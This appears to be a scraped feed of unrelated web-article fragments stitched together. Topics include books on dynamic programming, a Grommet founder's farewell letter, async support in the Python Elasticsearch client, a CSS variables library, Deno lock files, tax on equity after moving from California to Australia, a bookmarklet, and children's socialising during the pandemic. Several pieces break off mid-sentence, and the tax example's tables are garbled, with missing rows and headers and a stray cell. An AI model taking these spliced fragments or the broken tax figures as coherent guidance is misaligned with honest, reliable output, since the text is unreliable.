The term itself is a bit loaded, with <em>dynamic</em> being a broad word that can apply to many things. So really, what is dynamic programming?</p><p>First of all, the concept of <em>recursion</em> is a prerequisite to understanding dynamic programming. If you do not already have a foundation in data structures &amp; algorithms, I<a href="https://booksoncode.com/articles/data-structures-algorithms"> highly recommend studying Grokking Algorithms</a> first, which is the same book that introduced me to these concepts. </p><p>Simply put, <strong>dynamic programming is an optimization technique used to solve problems.</strong> <strong>This technique chunks the work into tiny pieces so that the same work is being performed over and over again.</strong> You may opt to use dynamic programming techniques in a coding interview or throughout your programming career.  </p><p>Dynamic programming caches values so that you don’t have to re-compute operations. This allows you to compute every value just once.</p><p>Great examples of problems you can solve with dynamic programming:</p><ul data-rte-list="default"><li><p>Calculating the Fibonacci sequence. </p></li><li><p>Calculating the amount of change you need to make up a dollar amount. For example, 32 cents USD is one quarter, one nickel, and two pennies. </p></li><li><p>Calculating the number of ways you can add or subtract an array of values to reach a target number. </p></li><li><p>Calculating the optimum combination of items you can include in a knapsack by the knapsack’s weight capacity.</p></li></ul><p>Dynamic programming isn’t best for all problems. In many instances, dynamic programming just can’t help us in the improvement of the runtime of a problem. If your program isn’t performing repeated work, no amount of caching will make any difference.</p><p>If you’re very new to the concept of dynamic programming or have never even heard of it before, don't worry. All of these books on dynamic programming explain the idea in the simplest terms.</p><h2>Overview of the Criteria For the Best Books on Dynamic Programming</h2></div></div><div data-aspect-ratio="50.70422535211267" data-block-type="5" id="block-yui_3_17_2_1_1594947342441_16112"><div>

This book dedicates one chapter per concept under dynamic programming. While discussing the ideas, the author provides straightforward examples. This allows you to maintain focus on the chapter's concept.</p><p>Once the concept is clear to you, the author then shifts focus to complex problem-solving.</p><h3><strong>Book 4: <em>Algorithms Illuminated (Part 3): Greedy Algorithms and Dynamic Programming</em></strong></h3></div></div><div data-block-type="23" id="block-yui_3_17_2_1_1594930016355_33881"><p><a target="_blank" href="https://www.amazon.com/gp/product/0999282948/ref=as_li_tl?ie=UTF8&amp;camp=1789&amp;creative=9325&amp;creativeASIN=0999282948&amp;linkCode=as2&amp;tag=booksoncode-20&amp;linkId=7359407268ab91ff1863a8a453d2538e"><img src="https://ws-na.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;MarketPlace=US&amp;ASIN=0999282948&amp;ServiceVersion=20070822&amp;ID=AsinImage&amp;WS=1&amp;Format=_SL250_&amp;tag=booksoncode-20"></a><img src="https://ir-na.amazon-adsystem.com/e/ir?t=booksoncode-20&amp;l=am2&amp;o=1&amp;a=0999282948" width="1" height="1" alt=""></p></div><div data-block-type="2" id="block-yui_3_17_2_1_1594930016355_33947"><div><p>Tim Roughgarden describes his <a href="https://amzn.to/3fN8sy8" target="_blank"><em>Algorithms Illuminated (Part 3): Greedy Algorithms and Dynamic Programming</em></a> book as an “accessible, no-nonsense, and programming language-agnostic introduction to algorithms.”&nbsp;</p><p>The book includes hints and solutions …</p></div></div></div></div></div></div></div></div></article></div></div></div></section></article></div></div>

Me and Joanne in front of one of our four homemade Grommet backdrops that were featured in all of our early videos.</p></div>
<p>Late last month, my Grommet co-founder Joanne Domeniconi and I were fired. Our majority shareholder Ace Hardware made the call, as is their right. It happens when visions for a company diverge.</p>
<p>Joanne and I are sad to abandon our Citizen Commerce™ mission and not see Grommet through to becoming a household name. But we feel nothing but a great deal of pride when we reflect on the hundreds of careers we shaped, the more than 3,000 small businesses we accelerated, and the thousands of jobs we created. We grew to a meaningful scale: where we could legitimately move markets and create demand for previously unheard-of products and even create new product categories. No one had heard of brands like SodaStream, Fitbit, OtterBox, PopSockets, S’well, Bombas, SimpliSafe and Mrs. Meyers when we embraced and launched them.</p>
<p>Upon hearing the news one Grommet maker wrote, “<em>I have said it so many times it must sound like a broken record, but what you created was pure magic</em>!”&nbsp; For a small business with an innovative product, breaking through in a crowded consumer world is excruciatingly difficult. Each Grommet we launched benefited handsomely from our reputation, credibility, and gaining access to our 4M followers.&nbsp; I always saw being chosen as a Grommet as cutting two years of struggle out of their path. Many awesome companies would have died on the vine if it were not for Grommet.</p>

<p>We employed hundreds of the best and brightest.&nbsp; One of the current team members said, “<em>The Grommet has made an impression on me in many ways in the three years since I joined. I’ve worked for a number of small companies now, and while most of their founders have had “hustle” to spare, I have not encountered&nbsp;anyone else with your commitment to&nbsp;values.&nbsp;I did not choose a career path which automatically involves helping others (doctor, nonprofit, etc.), so it has been a comfort to work for someone who steers the ship with moral conviction</em>.”</p>

<p>Lynda Applegate, a Harvard Business School professor, wrote a popular case on The Grommet. Out of the thousands of potential case study subjects at her disposal she chose Grommet because she said we were the kind of business that could uniquely thrive in a <strong>modern</strong> economy—with a groundbreaking approach to creating value for multiple parties. Here’s a small slice of what that means to me: I believe that each person in a company is sacred and capable of leadership. When individuals are <strong>truly</strong> engaged toward a common purpose, powerful gains can be delivered for customers, suppliers, society, and the planet. It is then that a great business–measured in revenue and profits–can also be a great company.&nbsp; I was not interested in one without the other. This is what Lynda recognized.</p>
<p>I also hope our Grommet alums will be brave on the innovation front. As one of our investors John Landry told me, “If you aren’t the lead dog you are just sniffing someone else’s butt.”&nbsp; We originated the use of video in e-commerce. We were the first company to assign societal/personal values to the products we sold. While corporations today are scrambling to show they “care” about products from minority or queer or veteran entrepreneurs, or from social enterprises, or about American made sourcing—moves that I wholeheartedly applaud—I take pride that we sourced all of our products according to those kind of values from Day One.</p>

<p>It seems so basic, but we built a company whose people and products you could trust implicitly. If retail were not a catastrophic race to the bottom, “trustworthiness” would not be a distinctive competitive asset–but it was at The Grommet. And it was measurable. While most e-commerce companies find that dissatisfied customers return 15-25% of what is bought, our customers only returned 3% of Grommets. And these are products from totally unknown small businesses. 3%!! This is because we curated carefully and only launched products worth buying, from people worth supporting.</p>

Our investors Bruce and Bridgett Evans, Jill Preotle, and Peter Lynch hosted a progressive dinner for our whole team to enjoy.</p></div>
<p>As a CEO, I am proud that we defied the odds and built a large-scale business, and shepherded it successfully through two financial crises and a global pandemic. We also defied the odds in attracting visionary angel investors like Peter Lynch and Jill Preotle–in a world where women founders get 2.7% of the funding from venture capitalists.&nbsp; We navigated not just one, but two, strategic investors over seven years.&nbsp; A public company CFO friend told me after the first investment (from the wonderful Rakuten) “<em>I have bought many companies. It never works for the founders. You won’t last six months.</em>” Ha!&nbsp; Joanne and I are not quitters. And we not only defied the odds in scaling the business, but also remained friends and partners throughout. We came into the venture together and there is poetry in the fact that we left Grommet the same way. Joanne and I were always a package deal.</p>
<p>I know this is kind of sappy, but I will think back at Grommet under our leadership as a form of “Camelot” for our team, our Makers and ourselves. My greatest hope is that Grommet alums will go on to use the lessons of how a business can both do good and do well. I know Grommet team members will be contributory to–and demanding of–their future employers when it comes to both ethical and executional standards. We all certainly learned a valuable lesson that one cannot simultaneously grow and harvest the same company–you have to pick a lane.</p>
<p><em>Sidebar: for some reason beyond my understanding, our amazing VP of Operations Jason McCarthy was also terminated. The company was on a fantastic 2020 trajectory with revenues up 50% over plan in May and 25% for the year. Jason was very, very central to that success—our business was extremely operationally intense. Jason is a dynamic leader whose teams will follow him anywhere. &nbsp;He was my go-to person for many things from brainstorming new initiatives to putting models and plans to an analytical or real-world test.&nbsp; At Grommet he had the broadest portfolio of responsibilities among all my reports, including Logistics, Inventory Planning, Account Management, Growth Services and Customer Support. &nbsp;He also founded and built our Wholesale business. &nbsp;Beyond all that he is a culture builder who earned deep respect and loyalty during his seven year+ tenure at Grommet, including mine of course. I will be very happy to introduce him to worthy employers and startup teams.</em></p>
<p>At the end of the day (and our run), while the future course of Grommet will not include its founders’ drive and hustle, or our moral and spiritual guidance, we are happy to have shown the way for individuals and companies to support small businesses, to celebrate&nbsp; the work of underrepresented entrepreneurs, to seek out quality products, and to honor trustworthy people.&nbsp; Grommet was the culmination of my life’s work—and Joanne’s. We share a deep satisfaction and priceless legacy with the many talented and committed individuals who made it all happen.&nbsp; I have no regrets. This is the simplest definition of success that I know.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><p>With the increasing popularity of Python web frameworks supporting asynchronous I/O like <a href="https://fastapi.tiangolo.com/">FastAPI</a>, <a href="https://www.starlette.io/">Starlette</a>, and <a href="https://docs.djangoproject.com/en/3.1/releases/3.1">soon in Django 3.1</a>, there has been a growing demand for native async I/O support in the Python Elasticsearch client.&nbsp; Async I/O is exciting because your application can use system resources efficiently compared to a traditional multi-threaded application, which leads to better performance on I/O-heavy workloads, like when serving a web application. </p> <p>The wait is over! Native async / await support is now available in <a href="https://www.elastic.co/guide/en/elasticsearch/client/python-api/current/index.html">version 7.8.0 of the package</a>, alongside support for all the shiny new Elasticsearch 7.8 APIs. To follow along with the below examples you’ll need Python 3.6 or later installed locally and an Elasticsearch 7.x cluster running. </p> <p><strong><h2>Installing and using the Elasticsearch Python client</h2></strong></p><p>Install the package using the <code>[async]</code> extra to install an additional dependency, <a href="https://docs.aiohttp.org/">Aiohttp</a>, which is used to make HTTP requests to your Elasticsearch instances: </p> <pre>$ python -m pip install elasticsearch[async] </pre> <p>After being successfully installed, you can now access an async native Elasticsearch client from Python.&nbsp; </p> <p>To show async in action, I’ll demonstrate&nbsp;using <a href="https://ipython.org/">IPython</a> since an event loop is available right away, allowing me to call <code>await</code> from the REPL. I’ll connect to an Elasticsearch instance hosted in <a href="https://www.elastic.co/cloud">Elastic Cloud</a> using the <a href="https://elasticsearch-py.readthedocs.io/en/master/#connecting-via-cloud-id"><code>cloud_id</code> parameter</a> for this quick demonstration: </p> <pre>$ ipython 
In [1]: from elasticsearch import AsyncElasticsearch 
In [2]: es = AsyncElasticsearch( 
   ...:   cloud_id=”async-example:cGVla2Fib28h...”, 
   ...:   http_auth=(“elastic”, “changeme”) 
   ...: ) 
In [3]: es.info()                                                          
Out[3]: &lt;coroutine object info at 0x7f2a59bb6fc0&gt; 
In [4]: # Returns a coroutine! We need to use 'await'                        
In [5]: await es.info()

  },

} </pre> <p><strong>Success!</strong>&nbsp; </p> <p><strong><h2>Start taking advantage of async</h2></strong></p><p>There’s <a href="https://elasticsearch-py.readthedocs.io/en/master/async.html">additional documentation on the asynchronous client</a> including information on using bulk helpers with async, a section on common scenarios you may encounter, and an example async web application project integrating Elasticsearch and Elastic APM.&nbsp; </p> <p>And if you haven’t tried <a href="https://www.elastic.co/apm">Elastic APM</a> yet, spin up a <a href="https://www.elastic.co/elasticsearch/service">free trial of Elasticsearch Service</a> today, instrument the APM Python agent, and make sure your application is spending its time where it should be. </p><p>If you’re interested in learning more about how the Python Elasticsearch client works, you can tune into the upcoming <a href="https://community.elastic.co/events/details/elastic-emea-virtual-presents-introduction-into-the-python-elasticsearch-client">Introduction into the Python Elasticsearch Client</a> webinar on August 5th that’ll include the basics, a discussion of the architecture, and lots of time for Q&amp;A.</p></div></div></div></div></div>]]>

July 16, 2020 | https://propjockey.github.io/css-media-vars/ | <a href="https://web.archive.org/web/*/https://propjockey.github.io/css-media-vars/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>
        css-media-vars adds several --custom-css-variables, all namespaced with "--media-" and based on media queries, onto the HTML tag. These vars act as universal mixins for your CSS values. If the media query is true, your value will be used. If it's false, the var(..., fallback) will be used.</p><p>
        
        For example, there are several named breakpoints that respond to the width of the screen, such as <code>--media-lte-sm</code>.</p><p>
        
        In your CSS, if you want a value to only apply when the screen is less than or equal to the "small" breakpoint range, you mix it into your value:<br>
        <code>--my-small-value: var(--media-lte-sm) 2px;</code><br>
        From this point, you can use your variable anywhere and it will only be "2px" if the media query is true. Else, it uses the fallback you provide, like so:<br>
        <code>border: var(--my-small-value, 15px) solid green;</code><br>
        <img src="https://propjockey.github.io/css-media-vars/suchborder.gif" alt="Border changing size at 900px breakpoint"><br>
        Here's a link to the jsbin pictured in the gif: <a href="https://jsbin.com/giqedowale/edit?css,output">https://jsbin.com/giqedowale/edit?css,output</a></p><p>
        
        If you need multiple break points, all you have to do is mix a different breakpoint into another variable and use it in the first fallback:<br>
        <code>
          --my-small-value: var(--media-lte-sm) 2px;<br>
          --my-medium-value: var(--media-md) 15px;<br>
          border: var(--my-small-value, var(--my-medium-value, 30px)) solid green;<br>
        </code><br>
        In this case, because the small values are listed first, this approach is <b>mobile-first</b>! CSS Variables don't compile the fallback unless it's used (similar to the expected short-circuting of conditionals in JavaScript).</p><p>
        
        This is all vanilla CSS. No JS or build step is necessary.<br>
        The library is small and built on a CSS trick called "Space Toggle" discovered in the development of <a href="http://augmented-ui.com/">augmented-ui</a>. You can read more about Space Toggle in these tweets which contain links to JSBins you can explore further with:<br>
        <a href="https://twitter.com/James0x57/status/1283596399196680192">Second Tweet, a simple demo</a><br>
        <a href="https://twitter.com/James0x57/status/1282303255826046977">First Tweet, an advanced demo</a></p><p>
        
        Browser support for CSS Variables is currently 94% globally according to <a href="https://caniuse.com/#feat=css-variables">caniuse</a>.<br>
        Each of the --media-* vars are using the actual media query in CSS to switch them to the "true" state. Browser support depends on the feature but will always behave as if it's "false" if the media query isn't supported in the user's browser, such as <code>--media-prefers-light</code> which only recently gained traction.

<p>Let's say your module depends on remote module . When you compile your module for the first time is retrieved, compiled and cached. It will remain this way until you run your module on a new machine (say in production) or reload the cache (through for example). But what happens if the content in the remote url is changed? This could lead to your production module running with different dependency code than your local module. Deno's solution to avoid this is to use integrity checking and lock files.</p>
<p>info from <a href="https://deno.land/manual/linking_to_external_code/integrity_checking" rel="noopener noreferrer" target="_blank">deno page</a></p>
<p><strong>use:</strong></p>
<pre><code>$ trex --lock file.ts
</code></pre>
<p>this generates a <code>lock.json</code> file.</p>
<p>if in input file you use <code>import_map.json</code> you can specify it.</p>
<pre><code>$ trex --lock --importmap file.ts
</code></pre>
<p>for more information this is the <a href="https://deno.land/manual/linking_to_external_code/integrity_checking" rel="noopener noreferrer" target="_blank">deno document</a></p>

<p>Usually I set up sites on VPS services like <a href="https://www.digitalocean.com/community/tutorials/how-to-install-wordpress-with-lamp-on-ubuntu-18-04">DigitalOcean</a>, but wanted to get better at producing quick <a href="https://en.wikipedia.org/wiki/Minimum_viable_product">minimum viable</a> proof of concepts. This will mean I focus on creating value, in this case content, instead of having to spend time on <a href="https://www.namecheap.com/resource-center/tutorials/building-your-first-website/">one hundred and one other things</a>.</p>



<p>In this instance I’ve chosen WordPress’s $48/year plan, as I’m used to the platform and willing to forego some of the niceties I’m used to like <a href="https://www.elegantthemes.com/blog/tips-tricks/how-to-connect-to-your-website-via-ssh-and-why-youd-want-to">full control of the machine with SSH access</a>, FTP to upload custom files, <a href="https://www.wpbeginner.com/showcase/24-must-have-wordpress-plugins-for-business-websites/">plugins</a> and additional custom software.</p>



<p>I didn’t expect however that I’d be prevented from making minor adjustments to my site like changing the header colour, centring the site title, changing link colours or fixing spacing.</p>



<p>WordPress also prevent you from removing their “powered by WordPress” advert at the bottom of your site. Although I mind that less because it’s a generally good platform and I’d like to encourage other people to share things they learn, with WordPress remaining a great platform to start doing so.</p>



<p>Just don’t expect much control over how individual things look, or be ready to pay for their $300/year business plan to do so.</p>

                <p>Let’s talk tax! Taxes aren’t the most interesting of topics, but as a mass
exodus from San Francisco begins in the wake of the COVID-19 pandemic, there are
a whole bunch of people working at Silicon Valley tech companies who are going
to have to start dealing with them in much more depth.</p>

<p>In general, people expect that taxes will be complicated in the year that they
move. However, if you’re being granted equity, as most Silicon Valley employees
are, you might be surprised to discover that they will be complicated for much
longer.</p>

<p>If you choose to move internationally, rather than just interstate, this counts
for double. My partner and I — neither of us US citizens — moved from San
Francisco to Sydney three years ago, and have spent the last few years figuring
out our tax situation. We struggled a lot to find good guidance on any of this
online, so I’m going to take the time to document what we learned in a few
posts, so that I can make the path more well-trodden for the next person.</p>

<p>Although I’ve spent a lot of time learning about this, I’m not a tax
professional. If any of it sounds wrong to you, or if you have your own story to
share, please <a href="mailto:hello@karla.io">reach out</a>!</p>

<h3 id="trailing-tax-liabilities">📆Trailing tax liabilities</h3>
<p>Income taxes sound like they should be simple: at the end of a tax year, you pay
a percentage of the amount that you earned that year to the relevant tax agency.
In some countries, your employer collects these taxes as you earn them
(<a href="https://en.wikipedia.org/wiki/Pay-as-you-earn_tax">PAYE/PAYG</a>), and you need
to think about them even less.</p>

<p>Equity complicates this situation. When you’re granted equity, you’re being
promised something of value. There’s a problem though: that equity might not yet
be liquid — it could have a vesting schedule, you might not have exercised it,
it could be in a private company… and if it’s not liquid, you probably
shouldn’t have to pay anything when it’s given to you. Many tax jurisdictions
handle this by choosing to tax you at a later point: rather than when the equity
is granted, instead taxing you when it vests, is exercised (in the case of
options), or is sold.</p>

<p>However, imagine you move tax jurisdictions between the date where you’re given
the equity, and the date on which you actually pay tax. The first jurisdiction
now has a problem: in their eyes, you earned that equity while you lived there,
and they only gave you a free pass on immediately paying tax on it through the
goodness of their hearts. When you eventually pay tax in the second tax
jurisdiction, they want a piece of that too.</p>

<p>This is a trailing tax liability.</p>

<p>Broadly speaking, any time that you’re granted equity in one jurisdiction, but
only trigger a taxation event on it in another, the first jurisdiction is likely
to say that they also have taxation rights.</p>

<p>That first jurisdiction is said to have “source” taxation rights, because that’s
where the asset was sourced, while the second is said to have “residency”
taxation rights, i.e. the right to tax you because you are presently a resident.</p>

<h3 id="apportioning-income">💰Apportioning income</h3>
<p>Now presumably, if you worked in both jurisdictions between the point where you
were given the equity, and the point at which you pay tax, there’s some
percentage that each should be considered the source of.</p>

<p>Internationally, this apportionment is governed by pairwise tax treaties between
countries. These are typically based on the
<a href="https://read.oecd-ilibrary.org/taxation/model-tax-convention-on-income-and-on-capital-condensed-version-2017_mtc_cond-2017-en#page28">OECD model tax convention</a>,
which helpfully has an in-depth commentary on this exact point
(<a href="https://read.oecd-ilibrary.org/taxation/model-tax-convention-on-income-and-on-capital-condensed-version-2017_mtc_cond-2017-en#page329">Commentary on Article 15, 12.14</a>).
In short, unless otherwise agreed between two countries, income is allocated
based on the percentage of <em>workdays</em> spent in each jurisdiction, from the day
the equity was granted, to the day that it vested. Note that this percentage
will differ for each tranche, or part of a grant, that vests on a different day.</p>

<p>However, those treaties only apply at the country to country level, i.e. for
taxes levied federally. In addition to imposing federal taxes, the US also has
state taxes, and these are not governed by international tax treaties.</p>

<p>That allows states to take a different view of how to decide whether income
belongs to them, and in fact, they do. For restricted stock, California takes
the same view as the tax treaty, and considers the period from grant to
vest. However, for someone granted options in California, who is a non-resident
when they exercise those options, the source is calculated by the percentage of
workdays spent in California from grant to <em>exercise</em>, rather than to vest (per
the <a href="https://www.ftb.ca.gov/forms/misc/1004.html">Equity-Based Compensation Guidelines</a>).</p>

<h3 id="residency-taxation">🏠Residency taxation</h3>
<p>But the tax doesn’t stop there! In addition to the source jurisdiction taxing
you for the percentage they believe is theirs, the jurisdiction in which you are
currently a resident will also want to tax you, typically on 100% of the
income you earn from an asset. This can lead to double taxation: residency
taxation means you need to pay tax on 100% of the income to your current tax
jurisdiction, but you also need to pay tax on some percentage of the income
(potentially up to 100% again) to the source jurisdiction.</p>

<p>Many tax agencies provide relief against this situation, in the form of tax
credits: if you’ve already had to pay tax in one location for the same event,
they won’t charge you again.</p>

<h3 id="worked-example">📔Worked example</h3>
<p>That’s a lot to take in, so let’s work through an example:</p>

<p>Let’s assume you were granted 1,000 non-qualified stock options (NSOs) with a
strike price of $1.00, on 2018-07-01, while a tax resident of California.
The options vest once a year for the next four years, in four equal tranches of
250.</p>

<p>(If you’re not familiar with options, an NSO gives you the right to purchase a
given company’s stock at a given price, regardless of its current market value.
In this case, the option would be valuable if the company’s stock price rose
above $1.00, because you could exercise your right to pay the company $1.00 for
a share, and then immediately sell that share at its market value, taking the
difference as a profit, and consequently, as income.)</p>

<p>About a year and a half later, on 2020-03-01, you move from California to
Melbourne, Australia. We can figure out the source of each of those tranches
like so:</p>

<table>
  <thead>
    <tr>
      <th>Tranche</th>
      <th>Relevant work period</th>
      <th>Total workdays</th>
      <th>US workdays</th>
      <th>AU workdays</th>
      <th>US source %</th>
      <th>AU source %</th>

      <td>100%</td>

      <td>2018-07-01 – 2020-07-01</td>
      <td>209</td>
      <td>174</td>
      <td>35</td>
      <td>83%</td>
      <td>17%</td>
    </tr>
    <tr>
      <td>2021-07-01</td>
      <td>2018-07-01 – 2021-07-01</td>
      <td>313</td>
      <td>174</td>
      <td>139</td>
      <td>56%</td>
      <td>44%</td>
    </tr>
    <tr>
      <td>2022-07-01</td>
      <td>2018-07-01 – 2022-07-01</td>
      <td>417</td>
      <td>174</td>
      <td>243</td>
      <td>42%</td>
      <td>58%</td>
    </tr>
  </tbody>
</table>

<p>Internationally, these percentages apply regardless of when you choose to
exercise those options, provided you do so after the date you move to Australia.
However, those options are also subject to taxation within California, and as
we’ve mentioned, the tax agency there believes in a different source percentage
scheme.</p>

<p>Let’s say that you don’t touch that equity until three years after your move,
on 2023-03-01, when you choose to exercise it all.</p>

<table>
  <thead>
    <tr>
      <th>Tranche</th>
      <th>Relevant work period</th>
      <th>Total workdays</th>
      <th>California workdays</th>

    </tr>
    <tr>
      <td>2020-07-01</td>
      <td>2018-07-01 – 2023-03-01</td>
      <td>487</td>
      <td>174</td>
      <td>36%</td>
    </tr>
    <tr>
      <td>2021-07-01</td>
      <td>2018-07-01 – 2023-03-01</td>
      <td>487</td>
      <td>174</td>
      <td>36%</td>
    </tr>
    <tr>
      <td>2022-07-01</td>
      <td>2018-07-01 – 2023-03-01</td>
      <td>487</td>
      <td>174</td>
      <td>36%</td>
    </tr>
  </tbody>
</table>

<p>If we assume that once exercised, but not prior, your options become liquid
shares, you’ll be taxed by each of the US federally, California, and Australia
on the day you exercise. Taking just the 2020-07-01 tranche into consideration:</p>

<ul>
  <li>you’ll be taxed on 83% of the income in the US,</li>
  <li>you’ll be taxed on 36% of the income in California, and</li>
  <li>you’ll be taxed on 100% of the income in Australia, which has residency
 taxation rights. However, you’ll be able to get tax credits for tax paid
 in the US federally on the 83% of the income considered to be foreign-sourced.</li>
</ul>

<p>This means that despite having lived outside of the US and California for 3
years on the date of exercise, you’ll still need to declare US and Californian
income, and pay tax in those jurisdictions. If you’d moved interstate within the
US, you’d still be filing federal returns regardless, but you’d also be required
to file a Californian return that year.</p>

<h3 id="gotchas">🔎Gotchas</h3>
<p>Note that there’s a big gotcha in the worked example above: you only got to
claim tax credits in Australia for the 83% income that the US taxed federally,
but not for the 36% that California taxed.</p>

<p>That’s because, as previously mentioned, the tax treaties only operate between
pairs of countries, not between one country and a state in the other. This
means it’s quite possible that you won’t be able to get tax credits for taxes
paid to a state of another country, and will end up double taxed on part of your
income.</p>

<p>For the worked example, Australia specifically
<a href="https://www.ato.gov.au/law/view/pdf/pbr/it2507.pdf">does consider Californian taxes to be a part of the US income tax system</a>,
so you would in actuality be allowed to claim credits for taxes paid there,
though the same isn’t true in all other countries.</p>

<h3 id="investments">📈Investments</h3>
<p>You might wonder what happens when you eventually sell the shares you get as
a result of exercising – will those also be subject to US or Californian
taxes? While I don’t have personal experience with this situation, the OECD
tax treaty commentary clarifies this point in
(<a href="https://read.oecd-ilibrary.org/taxation/model-tax-convention-on-income-and-on-capital-condensed-version-2017_mtc_cond-2017-en#page326">Article 15, 12.2</a>):
only the income effectively connected to your employment is taxable in the
source jurisdiction. Since exercising is considered to be an investment
decision, any increase in value of the share resulting from the exercise of an
option is considered to be a capital gain, and is therefore <em>not</em> taxable by the
source jurisdiction. Helpfully, this is also California’s interpretation, giving
us some much-needed consistency between what happens internationally and within
California.</p>

<p>If instead you had chosen to exercise prior to moving, the OECD commentary
states that when you moved the asset would be treated as being capital in
nature, and so would only be taxable in your jurisdiction of residence at sale.
However, several countries, including the US …</p></div></section></article></div></section></section></div>

<p>A privacy-focused bookmarklet to speak any text on a webpage using speech synthesis</p>
<h2>
Why?</h2>
<p>The other night, I found an interesting article, but was feeling too lazy to read it. While searching for a way to have the browser read it aloud, I discovered that most (all?) solutions involve adding yet another browser extension. It turns out that all modern browsers have a built-in library for <a href="https://developer.mozilla.org/en-US/docs/Web/API/SpeechSynthesis">speech synthesis</a>. This allows anyone to have their browser read any text on any webpage without calling any external services.</p>

<h2>
How does it look?</h2>

<h2>
Bookmarklet code</h2>
<p>This is equivalent to <a href="https://leonar15.github.io/SelectNSpeak/selectnspeak.min.js">selectnspeak.min.js</a> shown in this project, with additional escaping for better cross-brower compatibility.</p>

Online meetings are an entirely different medium than in-person ones and we need to get creative about the way we relate online and offline to make this work for our kids.&nbsp;</p><h3><strong>Here are a few ways you can develop your children’s social skills in-person during the pandemic:</strong></h3><ul data-rte-list="default"><li><p><strong>Forming a healthy attachment with your own child can go a long way </strong>in helping them develop meaningful connections with other kids down the road. <a href="https://www.facebook.com/groups/gentleparentsunite/">Gentle Parents Unite</a> is a wonderful group of parent coaches and engaged families who can help give you advice on how to connect with your child. Here are “<a href="https://childdevelopmentinfo.com/family-building/7-ways-to-connect-with-your-children">Seven ways to connect with your children</a>” from the Child Life Institute.&nbsp; </p></li></ul><ul data-rte-list="default"><li><p><strong>Nurturing relationships between siblings is a great way help children learn to socialize. </strong>We can use this time of quarantine to help our kids develop better relationships with each other so they can continue to support each other and be friends as adults, a time when they’ll maybe need each other most. The Mayo Clinic has some good advice on addressing <a href="https://www.mayoclinic.org/healthy-lifestyle/childrens-health/in-depth/sibling-rivalry/art-20046568">sibling rivalry</a> to get you started.</p></li></ul><ul data-rte-list="default"><li><p><strong>Quality socialization can happen with one other child</strong>. It doesn’t have to happen in a huge group. If your child is really craving in-person interaction, you can consider making friends with one other family who is also practicing social distancing. Doing this relationship well will help children function well in a group as well. Consider encouraging playdates with your child’s best friend from school or class. You can also reach out to local parenting groups on Facebook or Meetup to make online friends and set up playdates. Children often connect best around shared interests so talking about your child’s interests when you put the call out to friends - or finding online camps or classes can be a good way to make friends. If your child gravitated to a friend in their online camp or class, consider contacting the camp director to make an introduction to their parents and request an online playdate.&nbsp;</p></li></ul><ul data-rte-list="default"><li><p><strong>A nature hike wearing masks in a small group can be a good way to socialize. </strong>Consider going on a nature hike in a small group of 3-4 families where all kids and parents wear masks and families stay six feet apart on the trail, but definitely make sure you wear masks and that your children do too. Masks really do help stop the spread of Covid-19. While children don’t often exhibit symptoms of COVID, they most certainly carry it just as much as adults and can pass it along to more vulnerable family members. You can learn more about how <a href="https://abc7news.com/education/how-should-schools-reopen-expert-suggests-wearing-mask-is-safest-thing-to-do/6317558/">masks help stop the spread here.</a>&nbsp;</p></li></ul><h3><strong>It’s also possible to create joyful social experiences for kids online. Here are a few ideas to get you started.</strong></h3><ul data-rte-list="default"><li><p><strong>Set up your child’s online environment to encourage movement. </strong>Being online doesn’t mean you have to sit still. Set up your child’s space so they can bounce around, wiggle, dance and play while the screen is on.&nbsp;</p></li><li><p><strong>Encourage kids to do projects together online with one other child or a small group. </strong>Doing a project together online can be more enriching than just sitting and talking or listening to a lecture<strong>. </strong>Even if kids don’t talk during the project. While I bet you already have a lot of great ideas for arts and crafts, cooking or other activities, there are a lot of websites that can give you wonderful ideas for projects: <a href="https://www.teacherspayteachers.com/">Teachers Pay Teachers</a>, <a href="https://www.pinterest.com/">Pinterest</a>, <a href="https://www.youtube.com/">Youtube,</a> or <a href="https://www.enrichmentactivities.org/">The Ultimate Guide to Staying at Home With Kids</a>.&nbsp; I also encourage you to reach out to local parenting groups or learning communities like <a href="https://www.facebook.com/groups/445786889466638/">Amazing Educational Resources </a>or <a href="https://www.facebook.com/groups/seahomeschoolers">SEA homeschoolers</a> to ask for ideas for great projects that kids in your child’s age group can do online together.&nbsp;</p></li><li><p><strong>Get creative. </strong>If we stop trying to do online activities the way we do in persons ones, kids can have a lot of fun online, making friends and developing social skills.&nbsp;</p></li></ul><h3><strong>I asked families to share some of their best ideas for connecting online</strong>. <strong>Here’s what they said worked well for them</strong>.</h3><ul data-rte-list="default"><ul data-rte-list="default"><li><p><strong>Virtual playdates:</strong> One dad told me that his daughter spends an hour a day with her best friend on skype: playing, chatting and dancing around. The parents were thrilled after 3 months to give the girls a chance to get together for an in-person bike ride. After the bike ride, the father asked his daughter, “weren’t you so excited to see your friend in person?” To which the daughter replied, “what are you talking about? I see her every day!?”</p></li><li><p><strong>Tutoring and mentorship: </strong>Many sites like <a href="https://coda.io/@schoolhouse/welcome">Khan Academy</a> and<a href="https://schoolclosures.org/"> Schoolclosures.org</a> are offering free tutoring to families during the pandemic. One mom I spoke to told me that her six year old spends 2 hours a day talking to his physics teacher across the country.&nbsp;</p></li><li><p><strong>Try online classes and activities: </strong>As more and more families and teachers have started to innovate with online socialization. More and better social opportunities for kids have started to emerge online. Khan App Kids is giving free camps this summer. <a href="https://outschool.com/">Outschool</a> and <a href="https://www.hisawyer.com/">HiSawyer</a> offer great classes as well.&nbsp;</p></li><li><p><strong>Find a virtual sitter with special talents:</strong> One mom posted an ad on sittercity looking for a “ virtual sitter” and received hundreds of applications. It is only an hour at a time and she has 4 rotating sitters that all have different skills ( singer, actress, dancer etc.) She mini interviews with them and her daughter and she now looks forward to her “play date” with her sitters. They sing, dance, talk, play games. They’re all pretty young girls 18-20 and love this gig as they’re home for school.</p></li></ul></ul><div><p>If you’re trying to help your child make a friend or learn more about how to connect meaningfully online, please don’t hesitate to <a href="https://www.modulo.app/contact" target="_blank">reach out</a>.

<p><em>“Reading books is the real-life version of collecting mushrooms in Super Mario.”&nbsp;—</em> Random guy on Twitter</p>



<p>Ever walk down the aisles of a bookstore and feel an intense FOMO on all the books you want to read? You realize that time on Earth is finite, and when you combine the fact that you need to sleep, travel, work, and socialize, there is just no possible way to read everything you want.</p>



<p>To save time and stress, it helps to implement filters on what you read. Some effective filters include:</p>



